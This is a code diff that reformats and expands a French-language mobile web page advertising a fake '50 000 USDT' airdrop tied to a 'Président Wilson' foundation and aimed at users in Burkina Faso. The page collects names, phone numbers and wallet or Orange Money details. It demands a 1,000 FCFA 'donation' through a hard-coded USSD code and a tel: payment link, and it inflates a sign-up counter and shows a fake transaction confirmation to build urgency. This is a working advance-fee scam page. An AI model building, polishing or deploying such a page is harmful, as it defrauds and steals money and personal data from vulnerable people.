@@ -1,27 +1,519 @@
 <!DOCTYPE html>
-<html lang="fr"><head><meta charset="UTF-8"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>Nova</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}body{background:#070b12;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:12px;color:#e6f0fa}.a{max-width:440px;width:100%;background:rgba(17,26,38,.8);backdrop-filter:blur(20px);border-radius:40px;padding:24px 18px 30px;box-shadow:0 30px 60px rgba(0,0,0,.9),0 0 0 1px rgba(42,64,82,.5);position:relative;overflow:hidden;min-height:700px}.b{position:absolute;border-radius:50%;filter:blur(80px);opacity:.4;animation:f 12s infinite alternate ease-in-out;z-index:0}.b:nth-child(1){width:250px;height:250px;background:#d48c2c;top:-20%;left:-30%;animation-duration:14s}.b:nth-child(2){width:200px;height:200px;background:#7bc96a;bottom:-10%;right:-20%;animation-duration:18s;animation-delay:-4s}.b:nth-child(3){width:150px;height:150px;background:#4a7a9c;top:50%;left:50%;transform:translate(-50%,-50%);animation-duration:20s;animation-delay:-8s}@keyframes f{0%{transform:translate(0,0) scale(1)}33%{transform:translate(30px,-40px) scale(1.1)}66%{transform:translate(-20px,20px) scale(.9)}100%{transform:translate(10px,-10px) scale(1.05)}}.c{display:none;flex-direction:column;gap:16px;position:relative;z-index:2;animation:g .4s cubic-bezier(.22,1,.36,1)}.c.a{display:flex}@keyframes g{0%{opacity:0;transform:translateX(30px) scale(.98)}100%{opacity:1;transform:translateX(0) scale(1)}}.d{background:rgba(255,255,255,.04);backdrop-filter:blur(12px);border-radius:24px;padding:18px;border:1px solid rgba(255,255,255,.06);box-shadow:0 8px 32px rgba(0,0,0,.3)}.e{background:linear-gradient(135deg,#e8a344,#c97d1e);border:none;padding:16px;border-radius:60px;font-weight:700;font-size:16px;color:#0b0e14;cursor:pointer;width:100%;box-shadow:0 4px 15px rgba(212,140,44,.3)}.e:active{transform:scale(.94)}.f{background:0 0;color:#c0d4e6;border:1px solid #3a5268;box-shadow:none}.h{display:flex;flex-direction:column;gap:5px}.h label{font-size:13px;color:#a0b8cc}.h input{background:rgba(14,24,34,.8);border:1px solid #2a4052;border-radius:16px;padding:14px 16px;font-size:15px;color:#e6f0fa;outline:0;width:100%}.h input:focus{border-color:#d48c2c;box-shadow:0 0 0 4px rgba(212,140,44,.15)}.i{display:inline-flex;align-items:center;gap:6px;color:#8aaccc;font-size:14px;cursor:pointer;padding:4px 12px 4px 6px;border-radius:40px}.i:hover{color:#d48c2c;background:rgba(255,255,255,.04)}.j{background:linear-gradient(135deg,#1a2a1a,#0f1f0f);border-left:6px solid #7bc96a;padding:14px 16px;border-radius:20px;display:flex;justify-content:space-between;align-items:center;gap:12px;box-shadow:0 8px 30px rgba(0,0,0,.5);transform:translateX(-120%) scale(.8);opacity:0;transition:transform .7s cubic-bezier(.34,1.56,.64,1),opacity .6s;border:1px solid rgba(123,201,106,.2);margin:6px 0}.j.show{transform:translateX(0) scale(1);opacity:1}.j .msg strong{color:#d4ed4a}.k{background:#7bc96a;border:none;padding:8px 18px;border-radius:60px;font-weight:700;color:#0b0e14;cursor:pointer;font-size:13px;box-shadow:0 2px 10px rgba(123,201,106,.3)}.k:active{transform:scale(.92)}.l{background:rgba(42,26,26,.9);border:1px solid #d48c2c;border-radius:16px;padding:14px 16px;display:flex;justify-content:space-between;align-items:center;animation:m 2s infinite alternate;box-shadow:0 0 30px rgba(212,140,44,.05)}@keyframes m{0%{box-shadow:0 0 10px rgba(212,140,44,.1)}100%{box-shadow:0 0 35px rgba(212,140,44,.3)}}.n{background:#d48c2c;color:#0b0e14;font-weight:800;padding:2px 14px;border-radius:40px;font-size:11px;animation:o 1.5s infinite}@keyframes o{0%,100%{transform:scale(1)}50%{transform:scale(1.05);background:#e8a344}}.p{display:flex;background:rgba(14,24,34,.8);border-radius:60px;padding:4px;border:1px solid #2a4052}.p button{flex:1;background:0 0;border:none;padding:10px 0;border-radius:60px;font-weight:600;color:#8aaccc;cursor:pointer;font-size:14px;transition:all .3s cubic-bezier(.34,1.56,.64,1)}.p button.q{background:#d48c2c;color:#0b0e14;box-shadow:0 4px 15px rgba(212,140,44,.3);transform:scale(1.02)}.r{background:rgba(10,17,26,.9);border-radius:24px;padding:24px;text-align:center;border:2px solid rgba(212,140,44,.3);position:relative;overflow:hidden}.r::before{content:'';position:absolute;inset:-2px;border-radius:24px;padding:2px;background:conic-gradient(from 0,#d48c2c,#7bc96a,#d48c2c,#7bc96a,#d48c2c);-webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);-webkit-mask-composite:xor;mask-composite:exclude;animation:s 4s linear infinite}@keyframes s{to{transform:rotate(360deg)}}.t{font-size:28px;font-weight:800;letter-spacing:3px;background:#000;padding:14px;border-radius:16px;color:#7bc96a;font-family:monospace;margin:12px 0;border:1px solid #2a4a2a;position:relative;z-index:1}.u{font-size:28px;font-weight:800;background:linear-gradient(135deg,#f6d06a,#d48c2c,#f6d06a);background-size:200% 200%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:v 3s ease infinite}@keyframes v{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}.w{background:rgba(14,24,34,.8);border-radius:60px;padding:4px 14px;font-size:13px;border:1px solid #2a4052}.w span{color:#7bc96a;font-weight:700}.x{color:#6a8aa0;font-size:13px}.y{color:#f6b44a;font-weight:700}.z{text-align:center}#cv{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:10;border-radius:40px}</style></head><body><div class=a id=app><div class=b></div><div class=b></div><div class=b></div><canvas id=cv></canvas>
-<div class=c id=ph><div style=display:flex;justify-content:space-between;align-items:center><div><div class=u>🚀 Nova</div><div class=x style=font-size:14px>Offre Président Wilson</div></div><div class=w>👥 <span id=lc>1 254</span></div></div><div class=d style=padding:16px><p style=font-size:15px;font-weight:500>🎯 <span class=y>50 000 USDT</span> + Orange</p><p style=font-size:13px;color:#8aaccc>🔥 <strong id=sc>1 254</strong> inscrits</p></div><div class=j id=ns><div class=msg><strong>🎁 Bonus !</strong><br>50 000 USDT</div><button class=k id=cfn>Réclamer</button></div><div id=rac style=display:none><div class=l><div style=display:flex;align-items:center;gap:10px><span style=font-size:24px>💰</span><div><div style=font-weight:600>Bonus dispo</div><div style=font-size:13px;color:#aac0d0>50 000 USDT</div></div></div><span class=n>NOUVEAU</span></div><button class=e id=gtw style=margin-top:8px>⬇️ Retrait</button></div><div style=display:flex;gap:8px;flex-wrap:wrap><span style=background:#1e2b3a;padding:4px 14px;border-radius:40px;font-size:12px;border:1px solid #2f4a5a;color:#9bb4cc>✅ Instant</span><span style=background:#1e2b3a;padding:4px 14px;border-radius:40px;font-size:12px;border:1px solid #2f4a5a;color:#9bb4cc>🌍 Burkina</span><span style=background:#1e2b3a;padding:4px 14px;border-radius:40px;font-size:12px;border:1px solid #2f4a5a;color:#9bb4cc>🔒 Sécurisé</span></div><p class=x z>Offre limitée</p></div>
-<div class=c id=pc><div class=i id=bfc>⬅️ Retour</div><h2 style=font-size:22px>🎯 Réclamez</h2><p style=color:#aac0d0>Inscrivez-vous pour <span class=y>50 000 USDT</span></p><div class=h><label>Nom</label><input type=text id=cn placeholder="ex: Jean"></div><div class=h><label>Email / Tél</label><input type=text id=ce placeholder="ex: 70123456"></div><button class=e id=csb>🚀 Obtenir</button><p class=x z>En cliquant, vous validez.</p></div>
-<div class=c id=pw><div class=i id=bfw>⬅️ Retour</div><h2 style=font-size:20px>💸 Retrait</h2><div class=p id=mt><button class=q data-method=usdt>💳 USDT</button><button data-method=orange>📱 Orange</button></div><div id=uf><div class=h><label>Adresse USDT</label><input type=text id=wu placeholder=0x...></div></div><div id=of style=display:none><div class=h><label>Numéro Orange</label><input type=tel id=wo placeholder="70123456"></div></div><div class=h><label>Montant (USDT)</label><input type=text id=wa value="50 000" readonly style="background:rgba(26,42,54,.8);font-weight:700;color:#f6b44a;font-size:18px"></div><button class=e id=wcb>📤 Demander</button><p class=x z>Fonds sous 24h.</p></div>
-<div class=c id=pd><div class=i id=bfd>⬅️ Retour</div><h2 style=font-size:20px>🔒 Vérification</h2><div class=d style=border-left:4px solid #d48c2c><p style=font-size:14px>Dépôt (don) <strong>1 000 FCFA</strong> exigé.</p></div><div class=h><label>Votre téléphone</label><input type=tel id=dp placeholder="70123456"></div><div class=h><label>Montant (FCFA)</label><input type=text id=da value="1 000" readonly style="background:rgba(26,42,54,.8);font-weight:700;color:#f6b44a;font-size:18px"></div><button class=e id=dnb>Suivant ➡️</button><p class=x z>Don volontaire.</p></div>
-<div class=c id=pp><div class=i id=bfp>⬅️ Retour</div><h2 style=font-size:20px>💳 Paiement</h2><p>Code USSD pour <strong>1 000 FCFA</strong></p><div class=r><div class=t>*144*10*06992978*1000#</div></div><a href="tel:*144*10*06992978*1000%23" style=text-decoration:none;display:block><button class=e style="background:#7bc96a;border-color:#7bc96a;font-size:18px;box-shadow:0 4px 20px rgba(123,201,106,.4)">💸 PAYER</button></a><button class="e f" id=sps style=margin-top:4px>✅ Simuler</button></div>
-<div class=c id=ps><div style=text-align:center;padding:20px 0;position:relative;z-index:2><div style="font-size:80px;animation:bo .8s cubic-bezier(.34,1.56,.64,1)">✅</div><style>@keyframes bo{0%{transform:scale(0) rotate(-10deg);opacity:0}100%{transform:scale(1) rotate(0);opacity:1}}</style><h2 style=color:#7bc96a;margin:8px 0>Confirmé !</h2><p style=font-size:16px>Retrait de <strong>50 000 USDT</strong> en cours.</p><div class=d style=margin:12px 0;padding:12px><span style=font-size:13px>📦 #WIL-<span id=ti>8821</span></span></div><button class="e f" id=rab>🔄 Retour</button></div></div></div>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>NovaAirdrop – Offre Wilson</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, sans-serif;
+        }
+        body {
+            background: #080c14;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            color: #e6f0fa;
+        }
+        .app {
+            max-width: 440px;
+            width: 100%;
+            background: #111a26;
+            border-radius: 36px;
+            padding: 24px 18px 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.9);
+            border: 1px solid #2a4052;
+            position: relative;
+            min-height: 680px;
+        }
+        .page { display: none; flex-direction: column; gap: 16px; animation: fade 0.3s ease; }
+        .page.active { display: flex; }
+        @keyframes fade { 0%{opacity:0;transform:translateY(8px)} 100%{opacity:1;transform:translateY(0)} }
+
+        .btn {
+            background: #d48c2c;
+            border: none;
+            padding: 16px;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 16px;
+            color: #0b0e14;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.1s;
+        }
+        .btn:active { transform: scale(0.96); }
+        .btn-outline {
+            background: transparent;
+            color: #c0d4e6;
+            border: 1px solid #3a5268;
+        }
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .input-group label {
+            font-size: 13px;
+            color: #a0b8cc;
+        }
+        .input-group input {
+            background: #0e1822;
+            border: 1px solid #2a4052;
+            border-radius: 16px;
+            padding: 14px 16px;
+            font-size: 15px;
+            color: #e6f0fa;
+            outline: none;
+            width: 100%;
+        }
+        .input-group input:focus {
+            border-color: #d48c2c;
+            box-shadow: 0 0 0 3px #d48c2c33;
+        }
+        .back-link {
+            color: #8aaccc;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 4px 0;
+            width: fit-content;
+        }
+        .back-link:hover { color: #d48c2c; }
+        .highlight { color: #f6b44a; font-weight: 700; }
+        .text-muted { color: #6a8aa0; font-size: 13px; }
+        .text-center { text-align: center; }
+
+        /* Notification */
+        .notif {
+            background: #1a2a1a;
+            border-left: 5px solid #7bc96a;
+            padding: 14px 16px;
+            border-radius: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 12px;
+            transform: translateX(-120%);
+            opacity: 0;
+            transition: transform 0.6s ease, opacity 0.5s ease;
+        }
+        .notif.show {
+            transform: translateX(0);
+            opacity: 1;
+        }
+        .notif .msg strong { color: #d4ed4a; }
+        .claim-small {
+            background: #7bc96a;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 40px;
+            font-weight: 700;
+            color: #0b0e14;
+            cursor: pointer;
+            font-size: 13px;
+        }
+
+        /* Alerte retrait */
+        .alert-box {
+            background: #2a1a1a;
+            border: 1px solid #d48c2c;
+            border-radius: 16px;
+            padding: 14px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            animation: pulse 2s infinite alternate;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 5px #d48c2c22; }
+            100% { box-shadow: 0 0 25px #d48c2c66; }
+        }
+        .badge-new {
+            background: #d48c2c;
+            color: #0b0e14;
+            font-weight: 800;
+            padding: 2px 14px;
+            border-radius: 40px;
+            font-size: 11px;
+        }
+
+        /* Toggle */
+        .toggle-group {
+            display: flex;
+            background: #0e1822;
+            border-radius: 60px;
+            padding: 4px;
+            border: 1px solid #2a4052;
+        }
+        .toggle-group button {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 10px 0;
+            border-radius: 60px;
+            font-weight: 600;
+            color: #8aaccc;
+            cursor: pointer;
+            font-size: 14px;
+            transition: 0.2s;
+        }
+        .toggle-group button.active {
+            background: #d48c2c;
+            color: #0b0e14;
+        }
+
+        /* USSD */
+        .ussd-box {
+            background: #0a111a;
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            border: 2px dashed #d48c2c;
+        }
+        .ussd-code {
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: 2px;
+            background: #000;
+            padding: 12px;
+            border-radius: 16px;
+            color: #7bc96a;
+            font-family: monospace;
+            margin: 12px 0;
+        }
+
+        /* Solde */
+        .balance {
+            background: #0e1822;
+            padding: 14px 18px;
+            border-radius: 16px;
+            border: 1px solid #2a4052;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .balance .amount {
+            font-size: 32px;
+            font-weight: 700;
+            color: #f0f8ff;
+        }
+        .balance .amount small {
+            font-size: 16px;
+            color: #7a8fa6;
+            margin-left: 6px;
+        }
+    </style>
+</head>
+<body>
+<div class="app" id="app">
+
+    <!-- PAGE ACCUEIL -->
+    <div class="page active" id="page-home">
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+            <div>
+                <div style="font-size:28px; font-weight:800; background:linear-gradient(135deg,#f6d06a,#d48c2c); -webkit-background-clip:text; -webkit-text-fill-color:transparent;">🚀 NovaAirdrop</div>
+                <div class="text-muted">Offre Président Wilson</div>
+            </div>
+            <div style="background:#0e1822; padding:4px 14px; border-radius:60px; border:1px solid #2a4052; font-size:13px;">
+                👥 <span id="counter">1 254</span>
+            </div>
+        </div>
+
+        <div style="background:linear-gradient(135deg,#1f2a3a,#0a121e); border-radius:20px; padding:14px; border:1px solid #3a5a6a;">
+            <p style="font-size:15px; font-weight:500;">🎯 <span class="highlight">50 000 USDT</span> + Bonus Orange</p>
+            <p style="font-size:13px; color:#8aaccc;">🔥 Déjà <strong id="sub-counter">1 254</strong> inscrits</p>
+        </div>
+
+        <!-- Notification -->
+        <div class="notif" id="notif">
+            <div class="msg"><strong>🎁 Bonus instantané !</strong><br />50 000 USDT en attente.</div>
+            <button class="claim-small" id="claimBtn">Réclamer</button>
+        </div>
+
+        <!-- Alerte retrait (cachée) -->
+        <div id="alertContainer" style="display:none;">
+            <div class="alert-box">
+                <div style="display:flex; align-items:center; gap:10px;">
+                    <span style="font-size:24px;">💰</span>
+                    <div>
+                        <div style="font-weight:600;">Bonus disponible</div>
+                        <div style="font-size:13px; color:#aac0d0;">50 000 USDT prêts</div>
+                    </div>
+                </div>
+                <span class="badge-new">NOUVEAU</span>
+            </div>
+            <button class="btn" id="goWithdraw" style="margin-top:8px;">⬇️ Aller au retrait</button>
+        </div>
+
+        <div style="display:flex; gap:8px; flex-wrap:wrap;">
+            <span style="background:#1e2b3a; padding:4px 14px; border-radius:40px; font-size:12px; border:1px solid #2f4a5a;">✅ Instantané</span>
+            <span style="background:#1e2b3a; padding:4px 14px; border-radius:40px; font-size:12px; border:1px solid #2f4a5a;">🌍 Burkina</span>
+            <span style="background:#1e2b3a; padding:4px 14px; border-radius:40px; font-size:12px; border:1px solid #2f4a5a;">🔒 Sécurisé</span>
+        </div>
+        <p class="text-muted text-center">Offre limitée – premiers 1000</p>
+    </div>
+
+    <!-- PAGE INSCRIPTION -->
+    <div class="page" id="page-claim">
+        <div class="back-link" id="backClaim">⬅️ Retour</div>
+        <h2 style="font-size:22px;">🎯 Réclamez votre bonus</h2>
+        <p style="color:#aac0d0;">Inscrivez-vous pour <span class="highlight">50 000 USDT</span></p>
+        <div class="input-group">
+            <label>Nom complet</label>
+            <input type="text" id="claimName" placeholder="ex: Jean Kaboré" />
+        </div>
+        <div class="input-group">
+            <label>Email / Téléphone</label>
+            <input type="text" id="claimEmail" placeholder="ex: 70123456" />
+        </div>
+        <button class="btn" id="submitClaim">🚀 Obtenir mon bonus</button>
+        <p class="text-muted text-center">En cliquant, vous validez.</p>
+    </div>
+
+    <!-- PAGE RETRAIT -->
+    <div class="page" id="page-withdraw">
+        <div class="back-link" id="backWithdraw">⬅️ Retour</div>
+        <h2 style="font-size:20px;">💸 Formulaire de retrait</h2>
+        <div class="toggle-group" id="toggleMethod">
+            <button class="active" data-method="usdt">💳 USDT</button>
+            <button data-method="orange">📱 Orange</button>
+        </div>
+        <div id="usdtFields">
+            <div class="input-group">
+                <label>Adresse USDT</label>
+                <input type="text" id="withdrawUsdt" placeholder="0x..." />
+            </div>
+        </div>
+        <div id="orangeFields" style="display:none;">
+            <div class="input-group">
+                <label>Numéro Orange Money</label>
+                <input type="tel" id="withdrawOrange" placeholder="70123456" />
+            </div>
+        </div>
+        <div class="input-group">
+            <label>Montant (USDT)</label>
+            <input type="text" id="withdrawAmount" value="50 000" readonly style="background:#1a2a36; font-weight:700; color:#f6b44a; font-size:18px;" />
+        </div>
+        <button class="btn" id="confirmWithdraw">📤 Demander le retrait</button>
+        <p class="text-muted text-center">Fonds sous 24h.</p>
+    </div>
+
+    <!-- PAGE DÉPÔT -->
+    <div class="page" id="page-deposit">
+        <div class="back-link" id="backDeposit">⬅️ Retour</div>
+        <h2 style="font-size:20px;">🔒 Vérification requise</h2>
+        <div style="background:#1a1a2a; border-radius:16px; padding:14px; border-left:4px solid #d48c2c;">
+            <p style="font-size:14px;">Premier dépôt (don) de <strong>1 000 FCFA</strong> exigé par la fondation du Président Wilson.</p>
+        </div>
+        <div class="input-group">
+            <label>Votre téléphone (contact)</label>
+            <input type="tel" id="depositPhone" placeholder="70123456" />
+        </div>
+        <div class="input-group">
+            <label>Montant (FCFA)</label>
+            <input type="text" id="depositAmount" value="1 000" readonly style="background:#1a2a36; font-weight:700; color:#f6b44a; font-size:18px;" />
+        </div>
+        <button class="btn" id="nextPayment">Suivant ➡️</button>
+        <p class="text-muted text-center">Don volontaire.</p>
+    </div>
+
+    <!-- PAGE PAIEMENT USSD -->
+    <div class="page" id="page-payment">
+        <div class="back-link" id="backPayment">⬅️ Retour</div>
+        <h2 style="font-size:20px;">💳 Paiement</h2>
+        <p>Code USSD pour <strong>1 000 FCFA</strong></p>
+        <div class="ussd-box">
+            <div class="ussd-code">*144*10*06992978*1000#</div>
+        </div>
+        <a href="tel:*144*10*06992978*1000%23" style="text-decoration:none; display:block;">
+            <button class="btn" style="background:#7bc96a; border-color:#7bc96a; font-size:18px;">💸 PAYER MAINTENANT</button>
+        </a>
+        <p style="font-size:13px; color:#8aaccc; text-align:center;">Lance l'appel USSD sur votre téléphone.</p>
+        <button class="btn btn-outline" id="simulateSuccess" style="margin-top:4px;">✅ Simuler paiement (démo)</button>
+    </div>
+
+    <!-- PAGE SUCCÈS -->
+    <div class="page" id="page-success">
+        <div style="text-align:center; padding:20px 0;">
+            <div style="font-size:72px;">✅</div>
+            <h2 style="color:#7bc96a;">Paiement confirmé !</h2>
+            <p style="font-size:16px; margin:8px 0;">Retrait de <strong>50 000 USDT</strong> en cours.</p>
+            <div style="background:#1a2a1a; border-radius:16px; padding:12px; margin:12px 0; border:1px solid #3a6a3a;">
+                <span style="font-size:13px;">📦 Transaction #WIL-<span id="txnId">8821</span></span>
+            </div>
+            <button class="btn btn-outline" id="resetApp">🔄 Retour à l'accueil</button>
+        </div>
+    </div>
+
+</div>
+
 <script>
-let s={claimed:!1,method:'usdt'},p={ph:document.getElementById('ph'),pc:document.getElementById('pc'),pw:document.getElementById('pw'),pd:document.getElementById('pd'),pp:document.getElementById('pp'),ps:document.getElementById('ps')};
-function sp(n){Object.values(p).forEach(e=>e.classList.remove('c','active'));p[n].classList.add('c','active')}
-let c=1254;setInterval(()=>{c+=Math.floor(Math.random()*2);document.getElementById('lc').textContent=c.toLocaleString();document.getElementById('sc').textContent=c.toLocaleString()},3500);
-setTimeout(()=>document.getElementById('ns').classList.add('show'),2000);
-document.getElementById('cfn').onclick=()=>sp('pc');
-document.getElementById('bfc').onclick=()=>{sp('ph');if(s.claimed)document.getElementById('rac').style.display='block'};
-document.getElementById('csb').onclick=function(){let n=document.getElementById('cn').value.trim()||'Invité';this.innerHTML='⏳...';this.disabled=!0;setTimeout(()=>{s.claimed=!0;document.getElementById('rac').style.display='block';document.getElementById('ns').classList.remove('show');sp('ph');this.innerHTML='🚀 Obtenir';this.disabled=!1;alert('✅ '+n+', bonus activé !')},1200)};
-document.getElementById('gtw').onclick=()=>sp('pw');
-document.getElementById('bfw').onclick=()=>sp('ph');
-document.querySelectorAll('#mt button').forEach(b=>{b.onclick=function(){document.querySelectorAll('#mt button').forEach(x=>x.classList.remove('q'));this.classList.add('q');s.method=this.dataset.method;document.getElementById('uf').style.display=s.method==='usdt'?'block':'none';document.getElementById('of').style.display=s.method==='orange'?'block':'none'}});
-document.getElementById('wcb').onclick=function(){let v=s.method==='usdt'?document.getElementById('wu').value.trim():document.getElementById('wo').value.trim();if(!v){alert('Champ requis');return}sp('pd')};
-document.getElementById('bfd').onclick=()=>sp('pw');
-document.getElementById('dnb').onclick=function(){if(!document.getElementById('dp').value.trim()){alert('Téléphone requis');return}document.getElementById('ti').textContent=Math.floor(Math.random()*9000+1000);sp('pp')};
-document.getElementById('bfp').onclick=()=>sp('pd');
-document.getElementById('sps').onclick=function(){sp('ps');setTimeout(()=>{let c=document.getElementById('cv'),cx=c.getContext('2d');c.width=c.parentElement.offsetWidth;c.height=c.parentElement.offsetHeight;let ps=[],cl=['#f6b44a','#d48c2c','#7bc96a','#e84a5f','#fff'];for(let i=0;i<100;i++)ps.push({x:Math.random()*c.width,y:Math.random()*c.height-c.height,w:Math.random()*8+4,h:Math.random()*6+3,color:cl[Math.floor(Math.random()*cl.length)],vx:(Math.random()-.5)*4,vy:Math.random()*6+3,rot:Math.random()*360,rv:(Math.random()-.5)*6});let fr=0;function dr(){if(fr>150){cx.clearRect(0,0,c.width,c.height);return}cx.clearRect(0,0,c.width,c.height);ps.forEach(p=>{p.x+=p.vx;p.y+=p.vy;p.rot+=p.rv;p.vy+=.08;cx.save();cx.translate(p.x,p.y);cx.rotate(p.rot*Math.PI/180);cx.fillStyle=p.color;cx.globalAlpha=.9-(fr/180);cx.fillRect(-p.w/2,-p.h/2,p.w,p.h);cx.restore()});fr++;if(fr<150)requestAnimationFrame(dr)}dr()},300)};
-document.getElementById('rab').onclick=function(){s.claimed=!1;document.getElementById('rac').style.display='none';document.getElementById('ns').classList.remove('show');document.getElementById('cn').value='';document.getElementById('ce').value='';document.getElementById('wu').value='';document.getElementById('wo').value='';document.getElementById('dp').value='';sp('ph');setTimeout(()=>{if(!s.claimed)document.getElementById('ns').classList.add('show')},2000)};
-let os=sp;sp=function(n){os(n);if(n==='ph'){if(!s.claimed)setTimeout(()=>{if(!s.claimed)document.getElementById('ns').classList.add('show')},300);if(s.claimed)document.getElementById('rac').style.display='block'}};sp('ph');
-</script></body></html>
+    (function() {
+        // État
+        let state = {
+            claimed: false,
+            method: 'usdt'
+        };
+
+        // Pages
+        const pages = {
+            home: document.getElementById('page-home'),
+            claim: document.getElementById('page-claim'),
+            withdraw: document.getElementById('page-withdraw'),
+            deposit: document.getElementById('page-deposit'),
+            payment: document.getElementById('page-payment'),
+            success: document.getElementById('page-success')
+        };
+
+        function showPage(name) {
+            Object.values(pages).forEach(p => p.classList.remove('active'));
+            pages[name].classList.add('active');
+        }
+
+        // Compteur
+        let counter = 1254;
+        setInterval(() => {
+            counter += Math.floor(Math.random() * 2);
+            document.getElementById('counter').textContent = counter.toLocaleString();
+            document.getElementById('sub-counter').textContent = counter.toLocaleString();
+        }, 4000);
+
+        // Notification à 2s
+        setTimeout(() => {
+            document.getElementById('notif').classList.add('show');
+        }, 2000);
+
+        // Réclamer depuis la notif
+        document.getElementById('claimBtn').addEventListener('click', function() {
+            showPage('claim');
+        });
+
+        // Retour claim -> home
+        document.getElementById('backClaim').addEventListener('click', function() {
+            showPage('home');
+            if (state.claimed) {
+                document.getElementById('alertContainer').style.display = 'block';
+            }
+        });
+
+        // Soumettre l'inscription
+        document.getElementById('submitClaim').addEventListener('click', function() {
+            const name = document.getElementById('claimName').value.trim() || 'Invité';
+            state.claimed = true;
+            document.getElementById('alertContainer').style.display = 'block';
+            document.getElementById('notif').classList.remove('show');
+            showPage('home');
+            alert('✅ Félicitations ' + name + ' ! Votre bonus de 50 000 USDT est activé.');
+        });
+
+        // Aller au retrait
+        document.getElementById('goWithdraw').addEventListener('click', function() {
+            showPage('withdraw');
+        });
+
+        // Retour withdraw -> home
+        document.getElementById('backWithdraw').addEventListener('click', function() {
+            showPage('home');
+        });
+
+        // Toggle USDT / Orange
+        const toggleBtns = document.querySelectorAll('#toggleMethod button');
+        const usdtFields = document.getElementById('usdtFields');
+        const orangeFields = document.getElementById('orangeFields');
+
+        toggleBtns.forEach(btn => {
+            btn.addEventListener('click', function() {
+                toggleBtns.forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                state.method = this.dataset.method;
+                if (state.method === 'usdt') {
+                    usdtFields.style.display = 'block';
+                    orangeFields.style.display = 'none';
+                } else {
+                    usdtFields.style.display = 'none';
+                    orangeFields.style.display = 'block';
+                }
+            });
+        });
+
+        // Confirmer le retrait -> page dépôt
+        document.getElementById('confirmWithdraw').addEventListener('click', function() {
+            let value;
+            if (state.method === 'usdt') {
+                value = document.getElementById('withdrawUsdt').value.trim();
+                if (!value) { alert('Veuillez entrer une adresse USDT.'); return; }
+            } else {
+                value = document.getElementById('withdrawOrange').value.trim();
+                if (!value) { alert('Veuillez entrer un numéro Orange Money.'); return; }
+            }
+            showPage('deposit');
+        });
+
+        // Retour deposit -> withdraw
+        document.getElementById('backDeposit').addEventListener('click', function() {
+            showPage('withdraw');
+        });
+
+        // Suivant -> page paiement
+        document.getElementById('nextPayment').addEventListener('click', function() {
+            const phone = document.getElementById('depositPhone').value.trim();
+            if (!phone) { alert('Veuillez entrer votre numéro de téléphone.'); return; }
+            document.getElementById('txnId').textContent = Math.floor(Math.random() * 9000 + 1000);
+            showPage('payment');
+        });
+
+        // Retour payment -> deposit
+        document.getElementById('backPayment').addEventListener('click', function() {
+            showPage('deposit');
+        });
+
+        // Simuler succès
+        document.getElementById('simulateSuccess').addEventListener('click', function() {
+            showPage('success');
+        });
+
+        // Réinitialiser
+        document.getElementById('resetApp').addEventListener('click', function() {
+            state.claimed = false;
+            document.getElementById('alertContainer').style.display = 'none';
+            document.getElementById('notif').classList.remove('show');
+            document.getElementById('claimName').value = '';
+            document.getElementById('claimEmail').value = '';
+            document.getElementById('withdrawUsdt').value = '';
+            document.getElementById('withdrawOrange').value = '';
+            document.getElementById('depositPhone').value = '';
+            showPage('home');
+            setTimeout(() => {
+                if (!state.claimed) {
+                    document.getElementById('notif').classList.add('show');
+                }
+            }, 2000);
+        });
+
+        // Gestion du retour sur home
+        const originalShow = showPage;
+        showPage = function(name) {
+            originalShow(name);
+            if (name === 'home') {
+                if (!state.claimed) {
+                    setTimeout(() => {
+                        if (!state.claimed) document.getElementById('notif').classList.add('show');
+                    }, 300);
+                }
+                if (state.claimed) {
+                    document.getElementById('alertContainer').style.display = 'block';
+                }
+            }
+        };
+
+        // Démarrer
+        showPage('home');
+    })();
+</script>
+</body>
+</html>
